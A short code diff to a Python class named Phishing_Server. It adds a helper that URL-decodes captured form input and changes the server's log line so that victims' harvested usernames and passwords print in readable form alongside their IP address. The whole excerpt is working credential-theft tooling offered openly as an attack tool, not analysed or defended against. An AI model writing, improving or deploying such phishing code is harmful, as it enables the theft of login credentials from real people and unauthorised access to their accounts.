@@ -614,7 +614,13 @@ class Phishing_Server:
     </html>
         """
         return msg
-
+    def reformat_str(self, string):
+        return str(string).replace("+", " ").replace("%3C", "<").replace("%3E", ">").replace(
+        "%2F", "/").replace("%22", '"').replace("%27", "'").replace("%3D", "=").replace("%2B",
+        "+").replace("%3A", ":").replace("%28", "(").replace("%29", ")").replace("%2C", ","
+        ).replace("%3B", ";").replace("%20", " ").replace("%3F", "?").replace("%5C", "\\"
+        ).replace("%7B", "{").replace("%7D", "}").replace("%24", "$").replace("%0D", "\n"
+        ).replace("%0A", "   ")
     def handler(self, c, msg, ip):
         try:
             already_requested = False
@@ -646,7 +652,7 @@ class Phishing_Server:
                         ipaddr = ip
                     item += 1
                 try:
-                    print(f"\n[+] User Info Obtained from IP {ipaddr}.\n[+] Username: {username}\n[+] Password: {password}")
+                    print(f"\n[+] User Info Obtained from IP {ipaddr}.\n[+] Username: {self.reformat_str(username)}\n[+] Password: {self.reformat_str(password)}")
                 except:
                     pass
             if already_requested:
